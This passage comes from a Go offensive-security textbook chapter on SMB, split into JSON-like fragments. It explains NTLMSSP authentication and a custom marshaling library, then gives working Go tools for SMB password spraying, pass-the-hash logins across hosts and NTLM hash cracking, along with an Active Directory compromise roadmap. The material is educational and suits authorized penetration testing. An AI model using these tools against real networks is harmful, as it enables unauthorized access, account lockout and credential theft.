NTLM hash—which uses the domain, user, and\npassword as inputs—and then uses it in combination with the server challenge,\nrandom client challenge, and other data to generate the challenge response. It\nincludes this in a new Session Setup request message that the client sends to the\nserver. Unlike the message sent in step 3, the encapsulated security structure\nindicates that it’s an NTLMSSP Authenticate request. This way, the server can\ndifferentiate between the two Session Setup SMB requests.\n6. The server interacts with an authoritative resource, such as a domain controller\nfor authentication using domain credentials, to compare the challenge-response\ninformation the client supplied with the value the authoritative resource\ncalculated. If they match, the client is authenticated. The server sends a Session\nSetup response message back to the client, indicating that login was successful.\nThis message contains a unique session identifier that the client can use to track\nsession state.\n7. The client sends additional messages to access file shares, named pipes, printers,\nand so on; each message includes the session identifier as a reference through\nwhich the server can validate the authentication status of the client.\nYou might now begin to see how complicated SMB is and\nunderstand why there is neither a standard nor a third-party Go\npackage that implements the SMB specification. Rather than\ntake a comprehensive approach and discuss every nuance of\nthe libraries we created, let’s focus on a few of the structures,\nmessages, or unique aspects that can help you implement your\nown versions of well-defined networking protocols. Instead of\nextensive code listings, this chapter discusses only the good\nstuff, sparing you from information overload.\nYou can use the following relevant specifications as a\nreference, but don’t feel obligated to read each one. A Google\nsearch will let you find the latest revisions.\nMS-SMB2 The SMB2 specification to which we attempted\nto conform. This is the main specification of concern and\nencapsulates a Generic Security Service Application\nProgramming Interface (GSS-API) structure for performing\nauthentication.\nMS-SPNG and RFC 4178 The GSS-API specification\nwithin which the MS-NLMP data is encapsulated. The\nstructure is ASN.1 encoded.\nMS-NLMP The specification used for understanding\nNTLMSSP authentication token structure and challenge-\nresponse format. It includes formulas and specifics for\ncalculating things like the NTLM hash and authentication\nresponse token. Unlike the outer GSS-API container,\nNTLMSSP data isn’t ASN.1 encoded.\nASN.1 The specification for encoding data by using ASN.1\nformat.\nBefore we discuss the interesting snippets of code from the\npackage, you should understand some of the challenges you\nneed to overcome in order to get working SMB\ncommunications.\nUsing Mixed Encoding of Struct Fields\nAs we alluded to earlier, the SMB specification requires\npositional, binary, little-endian, fixed- and variable-length\nencoding for the majority of the message data. But some fields\nneed to be ASN.1 encoded, which uses explicitly tagged\nidentifiers for field index, type, and length. In this case, many\nof the ASN.1 subfields to be encoded are optional and not\nrestricted to a specific position or order within the message\nfield. This may help clarify the challenge.\nIn Listing 6-1, you can see a hypothetical Message struct that\npresents these challenges.\ntype Foo struct {\nX int\nY []byte\n}\ntype Message struct {\nA int // Binary, positional encoding\nB Foo // ASN.1 encoding as required by spec\nC bool // Binary, positional encoding\n}\nListing 6-1: A hypothetical example of a struct requiring variable field encodings\nThe crux of the problem here is that you can’t encode all\nthe types inside the Message struct by using the same encoding\nscheme because B, a Foo type, is expected to be ASN.1\nencoded, whereas other fields aren’t.\nWriting a Custom Marshaling and Unmarshaling Interface\nRecall from previous chapters that encoding schemes such as\nJSON or XML recursively encode the struct and all fields by\nusing the same encoding format. It was clean and simple. You\ndon’t have the same luxury here, because Go’s binary package\nbehaves the same way—it encodes all structs and struct fields\nrecursively without a care in the world, but this won’t work for\nyou because the message requires mixed encoding:\nbinary.Write(someWriter, binary.LittleEndian, message)\nThe solution is to create an interface that allows arbitrary\ntypes to define custom marshaling and unmarshaling logic\n(Listing 6-2).\n❶ type BinaryMarshallable interface {\n❷ MarshalBinary(*Metadata) ([]byte, error)\n❸ UnmarshalBinary([]byte, *Metadata) error\n}\nListing 6-2: An interface definition requiring custom marshaling and unmarshaling\nmethods\nThe interface ❶, BinaryMarshallable, defines two methods that\nmust be implemented: MarshalBinary() ❷ and UnmarshalBinary() ❸.\nDon’t worry too much about the Metadata type passed into the\nfunctions, as it’s not relevant to understand the main\nfunctionality.\nWrapping the Interface\nAny type that implements the BinaryMarshallable interface can\ncontrol its own encoding. Unfortunately, it’s not as simple as\njust defining a few functions on the Foo data type. After all,\nGo’s binary.Write() and binary.Read() methods, which you use for\nencoding and decoding binary data, don’t know anything\nabout your arbitrarily defined interface. You need to create a\nmarshal() and unmarshal() wrapper function, within which you\ninspect the data to determine whether the type implements the\nBinaryMarshallable interface, as in Listing 6-3. (All the code\nlistings at the root location of / exist under the provided github\nrepo https://github.com/blackhat-go/bhg/.)\nfunc marshal(v interface{}, meta *Metadata) ([]byte, error) {\n--snip--\nbm, ok := v.(BinaryMarshallable) ❶\nif ok {\n// Custom marshallable interface found.\nbuf, err := bm.MarshalBinary(meta) ❷\nif err != nil {\nreturn nil, err\n}\nreturn buf, nil\n}\n--snip--\n}\n--snip--\nfunc unmarshal(buf []byte, v interface{}, meta *Metadata) (interface{}, error) {\n--snip--\nbm, ok := v.(BinaryMarshallable) ❸\nif ok {\n// Custom marshallable interface found.\nif err := bm.UnmarshalBinary(buf, meta)❹; err != nil {\nreturn nil, err\n}\nreturn bm, nil\n}\n--snip--\n}\nListing 6-3: Using type assertions to perform custom data marshaling and\nunmarshaling (/ch-6/smb/smb/encoder/encoder.go)\nListing 6-3 details only a subsection of the marshal() and\nunmarshal() functions taken from https://github.com/blackhat-\ngo/bhg/blob/master/ch-6/smb/smb/encoder/encoder.go. Both\nfunctions contain a similar section of code that attempts to\nassert the supplied interface, v, to a BinaryMarshallable variable\nnamed bm ❶❸. This succeeds only if whatever type v is\nactually implements the necessary functions required by your\nBinaryMarshallable interface. If it succeeds, your marshal() function\n❷ makes a call to bm.MarshalBinary(), and your unmarshal() function\n❹ makes a call to bm.UnmarshalBinary(). At this point, your\nprogram flow will branch off into the type’s encoding and\ndecoding logic, allowing a type to maintain complete control\nover the way it’s handled.\nForcing ASN.1 Encoding\nLet’s look at how to force your Foo type to be ASN.1 encoded,\nwhile leaving other fields in your Message struct as-is. To do\nthis, you need to define the MarshalBinary() and UnmarshalBinary()\nfunctions on the type, as in Listing 6-4.\nfunc (f *Foo) MarshalBinary(meta *encoder.Metadata) ([]byte, error) {\nbuf, err := asn1.Marshal(*f)❶\nif err != nil {\nreturn nil, err\n}\nreturn buf, nil\n}\nfunc (f *Foo) UnmarshalBinary(buf []byte, meta *encoder.Metadata) error {\ndata := Foo{}\nif _, err := asn1.Unmarshal(buf, &data)❷; err != nil {\nreturn err\n}\n*f = data\nreturn nil\n}\nListing 6-4: Implementing the BinaryMarshallable interface for ASN.1 encoding\nThe methods don’t do much besides make calls to Go’s\nasn1.Marshal() ❶ and asn1.Unmarshal() ❷ functions. You can find\nvariations of these functions within the gss package code at\nhttps://github.com/blackhat-go/bhg/blob/master/ch-\n6/smb/gss/gss.go. The only real difference between them is\nthat the gss package code has additional tweaks to make Go’s\nasn1 encoding function play nicely with the data format defined\nwithin the SMB spec.\nThe ntlmssp package at https://github.com/blackhat-\ngo/bhg/blob/master/ch-6/smb/ntlmssp/ntlmssp.go contains an\nalternative implementation of the MarshalBinary() and\nUnmarshalBinary() functions. Although it doesn’t demonstrate\nASN.1 encoding, the ntlmssp code shows how to handle\nencoding of an arbitrary data type by using necessary\nmetadata. The metadata—the lengths and offsets of variable-\nlength byte slices—is pertinent to the encoding process. This\nmetadata leads us to the next challenge you need to address.\nUnderstanding Metadata and Referential Fields\nIf you dig into the SMB specification a little, you’ll find that\nsome messages contain fields that reference other fields of the\nsame message. For example, the fields—taken from the\nNegotiate response message—refer to the offset and length of\na variable-length byte slice that contains the actual value:\nSecurityBufferOffset (2 bytes): The offset, in bytes, from\nthe beginning of the SMB2 header to the security buffer.\nSecurityBufferLength (2 bytes): The length, in bytes, of\nthe security buffer.\nThese fields essentially act as metadata. Later in the\nmessage spec, you find the variable-length field within which\nyour data actually resides:\nBuffer (variable): The variable-length buffer that contains\nthe security buffer for the response, as specified by\nSecurityBufferOffset and SecurityBufferLength. The buffer\nSHOULD contain a token as produced by the GSS protocol\nHivaNetwork.Com\nas specified in section 3.3.5.4. If SecurityBufferLength is 0,\nthis field is empty and client-initiated authentication, with\nan authentication protocol of the client’s choice, will be\nused instead of server-initiated SPNEGO authentication, as\ndescribed in [MS-AUTHSOD] section 2.1.2.2.\nGenerally speaking, this is how the SMB spec consistently\nhandles variable-length data: fixed-position length and offset\nfields depicting the size and location of the data itself. This is\nnot specific to response messages or the Negotiate message,\nand often you’ll find multiple fields within a single message\nusing this pattern. Really, anytime you have a variable-length\nfield, you’ll find this pattern. The metadata explicitly instructs\nthe message receiver on how to locate and extract the data.\nThis is useful, but it complicates your encoding strategy\nbecause you now need to maintain a relationship between\ndifferent fields within a struct. You can’t, for example, just\nmarshal an entire message because some of the metadata fields\n—for example, length and offset—won’t be known until the\ndata itself is marshaled or, in the case of the offset, all fields\npreceding the data are marshaled.\nUnderstanding the SMB Implementation\nThe remainder of this subsection addresses some of the ugly\ndetails regarding the SMB implementation we devised. You\ndon’t need to understand this information to use the package.\nWe played around with a variety of approaches to handle\nreferential data, eventually settling on a solution that utilizes a\ncombination of structure field tags and reflection. Recall that\nreflection is a technique through which a program can inspect\nitself, particularly examining things like its own data types.\nField tags are somewhat related to reflection in that they\ndefine arbitrary metadata about a struct field. You may recall\nthem from previous XML, MSGPACK, or JSON encoding\nexamples. For example, Listing 6-5 uses struct tags to define\nJSON field names.\ntype Foo struct {\nA int `json:\"a\"`\nB string `json:\"b\"`\n}\nListing 6-5: A struct defining JSON field tags\nGo’s reflect package contains the functions we used to\ninspect data types and extract field tags. At that point, it was a\nmatter of parsing the tags and doing something meaningful\nwith their values. In Listing 6-6, you can see a struct defined\nin the SMB package.\ntype NegotiateRes struct {\nHeader\nStructureSize uint16\nSecurityMode uint16\nDialectRevision uint16\nReserved uint16\nServerGuid []byte `smb:\"fixed:16\"`❶\nCapabilities uint32\nMaxTransactSize uint32\nMaxReadSize uint32\nMaxWriteSize uint32\nSystemTime uint64\nServerStartTime uint64\nSecurityBufferOffset uint16 `smb:\"offset:SecurityBlob\"`❷\nSecurityBufferLength uint16 `smb:\"len:SecurityBlob\"`❸\nReserved2 uint32\nSecurityBlob *gss.NegTokenInit\n}\nListing 6-6: Using SMB field tags for defining field metadata (/ch-\n6/smb/smb/smb.go)\nThis type uses three field tags, identified by the SMB key:\nfixed ❶, offset ❷, and len ❸. Keep in mind that we chose all\nthese names arbitrarily. You aren’t obligated to use a specific\nname. The intent of each tag is as follows:\nfixed identifies a []byte as a fixed-length field of the provided size. In this case,\nServerGuid is 16 bytes in length.\noffset defines the number of bytes from the beginning of the struct to the first\nposition of a variable-length data buffer. The tag defines the name of the field—\nin this case, SecurityBlob—to which the offset relates. A field by this referenced\nname is expected to exist in the same struct.\nlen defines the length of a variable-length data buffer. The tag defines the name\nof the field—in this case, SecurityBlob, to which the length relates. A field by\nthis referenced name should exist in the same struct.\nAs you might have noticed, our tags allow us not only to\ncreate relationships—through arbitrary metadata—between\ndifferent fields, but also to differentiate between fixed-length\nbyte slices and variable-length data. Unfortunately, adding\nthese struct tags doesn’t magically fix the problem. The code\nneeds to have the logic to look for these tags and take specific\nactions on them during marshaling and unmarshaling.\nParsing and Storing Tags\nIn Listing 6-7, the convenience function, called parseTags(),\nperforms the tag-parsing logic and stores the data in a helper\nstruct of type TagMap.\nfunc parseTags(sf reflect.StructField❶) (*TagMap, error) {\nret := &TagMap{\nm: make(map[string]interface{}),\nhas: make(map[string]bool),\n}\ntag := sf.Tag.Get(\"smb\")❷\nsmbTags := strings.Split(tag, \",\")❸\nfor _, smbTag := range smbTags❹ {\ntokens := strings.Split(smbTag, \":\")❺\nswitch tokens[0] { ❻\ncase \"len\", \"offset\", \"count\":\nif len(tokens) != 2 {\nreturn nil, errors.New(\"Missing required tag data. Expecting key:val\")\n}\nret.Set(tokens[0], tokens[1])\ncase \"fixed\":\nif len(tokens) != 2 {\nreturn nil, errors.New(\"Missing required tag data. Expecting key:val\")\n}\ni, err := strconv.Atoi(tokens[1])\nif err != nil {\nreturn nil, err\n}\nret.Set(tokens[0], i) ❼\n}\nListing 6-7: Parsing structure tags (/ch-6/smb/smb/encoder/encoder.go)\nThe function accepts a parameter named sf of type\nreflect.StructField ❶, which is a type defined within Go’s reflect\npackage. The code calls sf.Tag.Get(\"smb\") on the StructField variable\nto retrieve any smb tags defined on the field ❷. Again, this is\nan arbitrary name we chose for our program. We just need to\nmake sure that the code to parse the tags is using the same key\nas the one we used in our struct’s type definition.\nWe then split the smb tags on a comma ❸, in case we need\nto have multiple smb tags defined on a single struct field in the\nfuture, and loop through each tag ❹. We split each tag on a\ncolon ❺—recall that we used the format name:value for our tags,\nsuch as fixed:16 and len:SecurityBlob. With the individual tag data\nseparated into its basic key and value pairing, we use a switch\nstatement on the key to perform key-specific validation logic,\nsuch as converting values to integers for fixed tag values ❻.\nLastly, the function sets the data in our custom map named\nret\n❼.\nInvoking the parseTags() Function and Creating a\nreflect.StructField Object\nNow, how do we invoke the function, and how do we create\nan object of type reflect.StructField? To answer these questions,\nlook at the unmarshal() function in Listing 6-8, which is within\nthe same source file that has our parseTags() convenience\nfunction. The unmarshal() function is extensive, so we’ll just\npiece together the most relevant portions.\nfunc unmarshal(buf []byte, v interface{}, meta *Metadata) (interface{}, error) {\ntypev := reflect.TypeOf(v) ❶\nvaluev := reflect.ValueOf(v) ❷\n--snip--\nr := bytes.NewBuffer(buf)\nswitch typev.Kind() { ❸\ncase reflect.Struct:\n--snip--\ncase reflect.Uint8:\n--snip--\ncase reflect.Uint16:\n--snip--\ncase reflect.Uint32:\n--snip--\ncase reflect.Uint64:\n--snip--\ncase reflect.Slice, reflect.Array:\n--snip--\ndefault:\nreturn errors.New(\"Unmarshal not implemented for kind:\" +\ntypev.Kind().String()), nil\n}\nreturn nil, nil\n}\nListing 6-8: Using reflection to dynamically unmarshal unknown types (/ch-\n6/smb/smb/encoder/encoder.go)\nThe unmarshal() function uses Go’s reflect package to retrieve\nthe type ❶ and value ❷ of the destination interface to which\nour data buffer will be unmarshaled. This is necessary because\nin order to convert an arbitrary byte slice into a struct, we need\nto know how many fields are in the struct and how many bytes\nto read for each field. For example, a field defined as uint16\nconsumes 2 bytes, whereas a uint64 consumes 8 bytes. By using\nreflection, we can interrogate the destination interface to see\nwhat data type it is and how to handle the reading of data.\nBecause the logic for each type will differ, we perform a switch\non the type by calling typev.Kind() ❸, which returns a reflect.Kind\ninstance indicating the kind of data type we’re working with.\nYou’ll see that we have a separate case for each of the allowed\ndata types.\nHandling Structs\nLet’s look at the case block, in Listing 6-9, that handles a struct\ntype, since that is a likely initial entry point.\ncase reflect.Struct:\nm := &Metadata{ ❶\nTags: &TagMap{},\nLens: make(map[string]uint64),\nParent: v,\nParentBuf: buf,\nOffsets: make(map[string]uint64),\nCurrOffset: 0,\n}\nfor i := 0; i < typev.NumField(); i++ { ❷\nm.CurrField = typev.Field(i).Name❸\ntags, err := parseTags(typev.Field(i))❹\nif err != nil {\nreturn nil, err\n}\nm.Tags = tags\nvar data interface{}\nswitch typev.Field(i).Type.Kind() { ❺\ncase reflect.Struct:\ndata, err = unmarshal(buf[m.CurrOffset:],\nvaluev.Field(i).Addr().Interface(), m)❻\ndefault:\ndata, err = unmarshal(buf[m.CurrOffset:], valuev.Field(i).Interface(),\nm)❼\n}\nif err != nil {\nreturn nil, err\n}\nvaluev.Field(i).Set(reflect.ValueOf(data)) ❽\n}\nv = reflect.Indirect(reflect.ValueOf(v)).Interface()\nmeta.CurrOffset += m.CurrOffset ❾\nreturn v, nil\nListing 6-9: Unmarshaling a struct type (/ch-6/smb/smb/encoder/encoder.go)\nThe case block begins by defining a new Metadata object ❶, a\ntype used to track relevant metadata, including the current\nbuffer offset, field tags, and other information. Using our type\nvariable, we call the NumField() method to retrieve the number\nof fields within the struct ❷. It returns an integer value that\nacts as the constraint for a loop.\nWithin the loop, we can extract the current field through a\ncall to the type’s Field(index int) method. The method returns a\nreflect.StructField type. You’ll see we use this method a few times\nthroughout this code snippet. Think of it as retrieving an\nelement from a slice by index value. Our first usage ❸\nretrieves the field to extract the field’s name. For example,\nSecurityBufferOffset and SecurityBlob are field names within the\nNegotiateRes struct defined in Listing 6-6. The field name is\nassigned to the CurrField property of our Metadata object. The\nsecond call to the Field(index int) method is inputted to the\nparseTags() function ❹ from Listing 6-7. We know this function\nparses our struct field tags. The tags are included in our Metadata\nobject for later tracking and usage.\nNext, we use a switch statement to act specifically on the\nfield type ❺. There are only two cases. The first handles\ninstances where the field itself is a struct ❻, in which case, we\nmake a recursive call to the unmarshal() function, passing to it a\npointer to the field as an interface. The second case handles all\nother kinds (primitives, slices, and so on), recursively calling\nthe unmarshal() function and passing it the field itself as an\ninterface ❼. Both calls do some funny business to advance the\nbuffer to start at our current offset. Our recursive call\neventually returns an interface{}, which is a type that contains\nour unmarshaled data. We use reflection to set our current\nfield’s value to the value of this interface data ❽. Lastly, we\nadvance our current offset in the buffer ❾.\nYikes! Can you see how this can be a challenge to\ndevelop? We have a separate case for every kind of input.\nLuckily, the case block that handles a struct is the most\ncomplicated.\nHandling uint16\nIf you are really paying attention, you’re probably asking:\nwhere do you actually read data from the buffer? The answer\nis nowhere in Listing 6-9. Recall that we are making recursive\ncalls to the unmarshal() function, and each time, we pass the inner\nfields to the function. Eventually we’ll reach primitive data\ntypes. After all, at some point, the innermost nested structs are\ncomposed of basic data types. When we encounter a basic data\ntype, our code will match against a different case in the\noutermost switch statement. For example, when we encounter a\nuint16 data type, this code executes the case block in Listing 6-\n10.\ncase reflect.Uint16:\nvar ret uint16\nif err := binary.Read(r, binary.LittleEndian, &ret)❶; err != nil {\nreturn nil, err\n}\nif meta.Tags.Has(\"len\")❷ {\nref, err := meta.Tags.GetString(\"len\")❸\nif err != nil {\nreturn nil, err\n}\nmeta.Lens[ref]❹ = uint64(ret)\n}\n❺ meta.CurrOffset += uint64(binary.Size(ret))\nreturn ret, nil\nListing 6-10: Unmarshaling uint16 data (/ch-6/smb/smb/encoder/encoder.go/)\nIn this case block, we make a call to binary.Read() in order to\nread data from our buffer into a variable, ret ❶. This function\nis smart enough to know how many bytes to read, based off\nthe type of the destination. In this case, ret is a uint16, so 2 bytes\nare read.\nNext, we check whether the len field tag is present ❷. If it\nis, we retrieve the value—that is, a field name—tied to that\nkey ❸. Recall that this value will be a field name to which the\ncurrent field is expected to refer. Because the length-\nidentifying fields precede the actual data in the SMB\nmessages, we don’t know where the buffer data actually\nresides, and so we can’t take any action yet.\nWe’ve just acquired length metadata, and there’s no better\nplace to store it than in our Metadata object. We store it within a\nmap[string]uint64 that maintains a relationship of reference field\nnames to their lengths ❹. Phrased another way, we now know\nhow long a variable-length byte slice needs to be. We advance\nthe current offset by the size of the data we just read ❺, and\nreturn the value read from the buffer.\nSimilar logic and metadata tracking happen in the process\nof handling the offset tag information, but we omitted that code\nfor brevity.\nHandling Slices\nIn Listing 6-11, you can see the case block that unmarshals\nslices, which we need to account for both fixed- and variable-\nlength data while using tags and metadata in the process.\ncase reflect.Slice, reflect.Array:\nswitch typev.Elem().Kind()❶ {\ncase reflect.Uint8:\nvar length, offset int ❷\nvar err error\nif meta.Tags.Has(\"fixed\") {\nif length, err = meta.Tags.GetInt(\"fixed\")❸; err != nil {\nHivaNetwork.Com\nreturn nil, err\n}\n// Fixed length fields advance current offset\nmeta.CurrOffset += uint64(length) ❹\n} else {\nif val, ok := meta.Lens[meta.CurrField]❺; ok {\nlength = int(val)\n} else {\nreturn nil, errors.New(\"Variable length field missing length reference in\nstruct\")\n}\nif val, ok := meta.Offsets[meta.CurrField]❻; ok {\noffset = int(val)\n} else {\n// No offset found in map. Use current offset\noffset = int(meta.CurrOffset)\n}\n// Variable length data is relative to parent/outer struct.\n// Reset reader to point to beginning of data\nr = bytes.NewBuffer(meta.ParentBuf[offset : offset+length])\n// Variable length data fields do NOT advance current offset.\n}\ndata := make([]byte, length) ❼\nif err := binary.Read(r, binary.LittleEndian, &data)❽; err != nil {\nreturn nil, err\n}\nreturn data, nil\nListing 6-11: Unmarshaling fixed- and variable-length byte slices (/ch-\n6/smb/smb/encoder/encoder.go/)\nFirst, we use reflection to determine the slice’s element\ntype ❶. For example, handling of []uint8 is different from\n[]uint32, as the number of bytes per element differs. In this case,\nwe’re handling only []uint8 slices. Next, we define a couple of\nlocal variables, length and offset, to use for tracking the length of\nthe data to read and the offset within the buffer from which to\nbegin reading ❷. If the slice is defined with the fixed tag, we"
  },
  {
    "input": "Guessing Passwords with SMB",
    "output": "retrieve the value and assign it to length ❸. Recall that the tag\nvalue for the fixed key is an integer that defines the length of\nthe slice. We’ll use this length to advance the current buffer\noffset for future reads ❹. For fixed-length fields, the offset is\nleft as its default value—zero—since it will always appear at\nthe current offset. Variable-length slices are slightly more\ncomplex because we retrieve both the length ❺ and offset ❻\ninformation from our Metadata structure. A field uses its own\nname as the key for the lookup of the data. Recall how we\npopulated this information previously. With our length and offset\nvariables properly set, we then create a slice of the desired\nlength ❼ and use it in a call to binary.Read() ❽. Again, this\nfunction is smart enough to read bytes up until our destination\nslice has been filled.\nThis has been an exhaustingly detailed journey into the\ndark recesses of custom tags, reflection, and encoding with a\nhint of SMB. Let’s move beyond this ugliness and do\nsomething useful with the SMB library. Thankfully, the\nfollowing use cases should be significantly less complicated.\nGUESSING PASSWORDS WITH SMB\nThe first SMB case we’ll examine is a fairly common one for\nattackers and pen testers: online password guessing over SMB.\nYou’ll try to authenticate to a domain by providing commonly\nused usernames and passwords. Before diving in, you’ll need\nto grab the SMB package with the following get command:\n$ go get github.com/bhg/ch-6/smb\nOnce the package is installed, let’s get to coding. The code\nyou’ll create (shown in Listing 6-12) accepts a file of newline-\nseparated usernames, a password, a domain, and target host\ninformation as command line arguments. To avoid locking\naccounts out of certain domains, you’ll attempt a single\npassword across a list of users rather than attempt a list of\npasswords across one or more users.\nWARNING\nOnline password guessing can lock accounts out of a domain, effectively\nresulting in a denial-of-service attack. Take caution when testing your code\nand run this against only systems on which you’re authorized to test.\nfunc main() {\nif len(os.Args) != 5 {\nlog.Fatalln(\"Usage: main </user/file> <password> <domain>\n<target_host>\")\n}\nbuf, err := ioutil.ReadFile(os.Args[1])\nif err != nil {\nlog.Fatalln(err)\n}\noptions := smb.Options❶{\nPassword: os.Args[2],\nDomain: os.Args[3],\nHost: os.Args[4],\nPort: 445,\n}\nusers := bytes.Split(buf, []byte{'\\n'})\nfor _, user := range users❷ {\n❸ options.User = string(user)\nsession, err := smb.NewSession(options, false)❹\nif err != nil {\nfmt.Printf(\"[-] Login failed: %s\\\\%s [%s]\\n\",\noptions.Domain,\noptions.User,"
  },
  {
    "input": "Reusing Passwords with the Pass-the-Hash Technique",
    "output": "options.Password)\ncontinue\n}\ndefer session.Close()\nif session.IsAuthenticated❺ {\nfmt.Printf(\"[+] Success : %s\\\\%s [%s]\\n\",\noptions.Domain,\noptions.User,\noptions.Password)\n}\n}\n}\nListing 6-12: Leveraging the SMB package for online password guessing (/ch-\n6/password-guessing/main.go)\nThe SMB package operates on sessions. To establish a\nsession, you first initialize an smb.Options instance that will\ncontain all your session options, including target host, user,\npassword, port, and domain ❶. Next, you loop through each\nof your target users ❷, setting the options.User value\nappropriately ❸, and issue a call to smb.NewSession() ❹. This\nfunction does a lot of heavy lifting for you behind the scenes:\nit negotiates both the SMB dialect and authentication\nmechanism, and then authenticates to the remote target. The\nfunction will return an error if authentication fails, and a\nboolean IsAuthenticated field on the session struct is populated\nbased off the outcome. It will then check the value to see\nwhether the authentication succeeded, and if it did, display a\nsuccess message ❺.\nThat is all it takes to create an online password-guessing\nutility.\nREUSING PASSWORDS WITH THE\nPASS-THE-HASH TECHNIQUE\nPASS-THE-HASH TECHNIQUE\nThe pass-the-hash technique allows an attacker to perform\nSMB authentication by using a password’s NTLM hash, even\nif the attacker doesn’t have the cleartext password. This\nsection walks you through the concept and shows you an\nimplementation of it.\nPass-the-hash is a shortcut to a typical Active Directory\ndomain compromise, a type of attack in which attackers gain\nan initial foothold, elevate their privileges, and move laterally\nthroughout the network until they have the access levels they\nneed to achieve their end goal. Active Directory domain\ncompromises generally follow the roadmap presented in this\nlist, assuming they take place through an exploit rather than\nsomething like password guessing:\n1. The attacker exploits the vulnerability and gains a foothold on the network.\n2. The attacker elevates privileges on the compromised system.\n3. The attacker extracts hashed or cleartext credentials from LSASS.\n4. The attacker attempts to recover the local administrator password via offline\ncracking.\n5. The attacker attempts to authenticate to other machines by using the\nadministrator credentials, looking for reuse of the password.\n6. The attacker rinses and repeats until the domain administrator or other target has\nbeen compromised.\nWith NTLMSSP authentication, however, even if you fail\nto recover the cleartext password during step 3 or 4, you can\nproceed to use the password’s NTLM hash for SMB\nauthentication during step 5—in other words, passing the hash.\nPass-the-hash works because it separates the hash\ncalculation from the challenge-response token calculation. To\nsee why this is, let’s look at the following two functions,\ndefined by the NTLMSSP specification, pertaining to the\ncryptographic and security mechanisms used for\nauthentication:\nNTOWFv2 A cryptographic function that creates an MD5\nHMAC by using the username, domain, and password\nvalues. It generates the NTLM hash value.\nComputeResponse A function that uses the NTLM hash in\ncombination with the message’s client and server\nchallenges, timestamp, and target server name to produce a\nGSS-API security token that can be sent for authentication.\nYou can see the implementations of these functions in\nListing 6-13.\nfunc Ntowfv2(pass, user, domain string) []byte {\nh := hmac.New(md5.New, Ntowfv1(pass))\nh.Write(encoder.ToUnicode(strings.ToUpper(user) + domain))\nreturn h.Sum(nil)\n}\nfunc ComputeResponseNTLMv2(nthash❶, lmhash, clientChallenge,\nserverChallenge, timestamp,\nserverName []byte) []byte {\ntemp := []byte{1, 1}\ntemp = append(temp, 0, 0, 0, 0, 0, 0)\ntemp = append(temp, timestamp...)\ntemp = append(temp, clientChallenge...)\ntemp = append(temp, 0, 0, 0, 0)\ntemp = append(temp, serverName...)\ntemp = append(temp, 0, 0, 0, 0)\nh := hmac.New(md5.New, nthash)\nh.Write(append(serverChallenge, temp...))\nntproof := h.Sum(nil)\nreturn append(ntproof, temp...)\n}\nListing 6-13: Working with NTLM hashes (/ch-6/smb/ntlmssp/crypto.go)\nThe NTLM hash is supplied as input to the\nComputeResponseNTLMv2 function ❶, meaning the hash has been\ncreated independently of the logic used for security token\ncreation. This implies that hashes stored anywhere—even in\nLSASS—are considered precalculated, because you don’t\nneed to supply the domain, user, or password as input. The\nauthentication process is as follows:\n1. Calculate the user’s hash by using the domain, user, and password values.\n2. Use the hash as input to calculate authentication tokens for NTLMSSP over\nSMB.\nSince you already have a hash in hand, you’ve already\ncompleted step 1. To pass the hash, you initiate your SMB\nauthentication sequence, as you defined it way back in the\nopening sections of this chapter. However, you never calculate\nthe hash. Instead, you use the supplied value as the hash itself.\nListing 6-14 shows a pass-the-hash utility that uses a\npassword hash to attempt to authenticate as a specific user to a\nlist of machines.\nfunc main() {\nif len(os.Args) != 5 {\nlog.Fatalln(\"Usage: main <target/hosts> <user> <domain> <hash>\")\n}\nbuf, err := ioutil.ReadFile(os.Args[1])\nif err != nil {\nlog.Fatalln(err)\n}\noptions := smb.Options{"
  },
  {
    "input": "Recovering NTLM Passwords",
    "output": "User: os.Args[2],\nDomain: os.Args[3],\nHash❶: os.Args[4],\nPort: 445,\n}\ntargets := bytes.Split(buf, []byte{'\\n'})\nfor _, target := range targets❷ {\noptions.Host = string(target)\nsession, err := smb.NewSession(options, false)\nif err != nil {\nfmt.Printf(\"[-] Login failed [%s]: %s\\n\", options.Host, err)\ncontinue\n}\ndefer session.Close()\nif session.IsAuthenticated {\nfmt.Printf(\"[+] Login successful [%s]\\n\", options.Host)\n}\n}\n}\nListing 6-14: Passing the hash for authentication testing (/ch-6/password-\nreuse/main.go)\nThis code should look similar to the password-guessing\nexample. The only significant differences are that you’re\nsetting the Hash field of smb.Options (not the Password field) ❶ and\nyou’re iterating over a list of target hosts (rather than target\nusers) ❷. The logic within the smb.NewSession() function will use\nthe hash value if populated within the options struct.\nRECOVERING NTLM PASSWORDS\nIn some instances, having only the password hash will be\ninadequate for your overall attack chain. For example, many\nservices (such as Remote Desktop, Outlook Web Access, and\nothers) don’t allow hash-based authentication, because it either\nisn’t supported or isn’t a default configuration. If your attack\nchain requires access to one of these services, you’ll need a\ncleartext password. In the following sections, you’ll walk\nthrough how hashes are calculated and how to create a basic\npassword cracker.\nCalculating the Hash\nIn Listing 6-15, you perform the magic of calculating the hash.\nfunc NewAuthenticatePass(domain, user, workstation, password string, c\nChallenge) Authenticate\n{\n// Assumes domain, user, and workstation are not unicode\nnthash := Ntowfv2(password, user, domain)\nlmhash := Lmowfv2(password, user, domain)\nreturn newAuthenticate(domain, user, workstation, nthash, lmhash, c)\n}\nfunc NewAuthenticateHash(domain, user, workstation, hash string, c Challenge)\nAuthenticate {\n// Assumes domain, user, and workstation are not unicode\nbuf := make([]byte, len(hash)/2)\nhex.Decode(buf, []byte(hash))\nreturn newAuthenticate(domain, user, workstation, buf, buf, c)\n}\nListing 6-15: Calculating hashes (/ch-6/smb/ntlmssp/ntlmssp.go)\nThe logic to call the appropriate function is defined\nelsewhere, but you’ll see that the two functions are similar.\nThe real difference is that password-based authentication in\nthe NewAuthenticatePass() function computes the hash before\ngenerating the authentication message, whereas the\nNewAuthenticateHash() function skips that step and uses the\nsupplied hash directly as input to generate the message.\nRecovering the NTLM Hash\nIn Listing 6-16, you can see a utility that recovers a password\nby cracking a supplied NTLM hash.\nfunc main() {\nif len(os.Args) != 5 {\nlog.Fatalln(\"Usage: main <dictionary/file> <user> <domain> <hash>\")\n}\nhash := make([]byte, len(os.Args[4])/2)\n_, err := hex.Decode(hash, []byte(os.Args[4]))❶\nif err != nil {\nlog.Fatalln(err)\n}\nf, err := ioutil.ReadFile(os.Args[1])\nif err != nil {\nlog.Fatalln(err)\n}\nvar found string\npasswords := bytes.Split(f, []byte{'\\n'})\nfor _, password := range passwords❷ {\nh := ntlmssp.Ntowfv2(string(password), os.Args[2], os.Args[3]) ❸\nif bytes.Equal(hash, h)❹ {\nfound = string(password)\nbreak\n}\n}\nif found != \"\" {\nfmt.Printf(\"[+] Recovered password: %s\\n\", found)\n} else 